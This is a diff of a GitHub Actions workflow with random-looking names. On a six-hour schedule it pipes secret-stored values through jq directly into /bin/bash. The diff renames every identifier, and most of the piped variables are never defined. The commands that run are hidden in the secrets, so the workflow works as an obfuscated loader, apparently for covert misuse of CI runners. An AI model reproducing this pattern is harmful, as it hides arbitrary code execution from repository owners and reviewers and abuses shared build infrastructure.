@@ -3,28 +3,23 @@ name: wudushu4671
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 0/6 * * *'
+    - cron: '17 0/6 * * *'
 
-jobs:  # 27364
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wudushu4671
         env:
-          vguzy8538: ${{ secrets.vguzy8538 }}
+          dyhb17: ${{ secrets.dyhb17 }}
         run: |
-          echo $vguzy8538 | jq -r .jyllz0752 | /bin/bash
-          echo $bljrk54 | jq -r .vh95 | /bin/bash
-          echo $fptpz5729 | jq -r .php83144 | /bin/bash
-          echo $ntfnc422 | jq -r .ihlz104 | /bin/bash
-          echo $x22 | jq -r .v8732 | /bin/bash
-          echo $cuzb0 | jq -r .k37900 | /bin/bash
-          echo $qz48216 | jq -r .h25729 | /bin/bash
-          echo $id560 | jq -r .o41 | /bin/bash
-          echo $wb47872 | jq -r .x247 | /bin/bash
-          echo $efet9969 | jq -r .p1 | /bin/bash
-          echo $adtou57 | jq -r .sxrk4945 | /bin/bash
-          echo $djng39 | jq -r .kt62579 | /bin/bash
+          echo $dyhb17 | jq -r .nak24 | /bin/bash
+          echo $qtion10 | jq -r .berux2 | /bin/bash
+          echo $cn11 | jq -r .i4 | /bin/bash
+          echo $bidgk52919 | jq -r .he608 | /bin/bash
+          echo $bzhi38 | jq -r .zow81 | /bin/bash
+          echo $boam3583 | jq -r .wvq87 | /bin/bash
+          echo $pabr5109 | jq -r .hx25 | /bin/bash
+          echo $kdxe973 | jq -r .asme8787 | /bin/bash
 
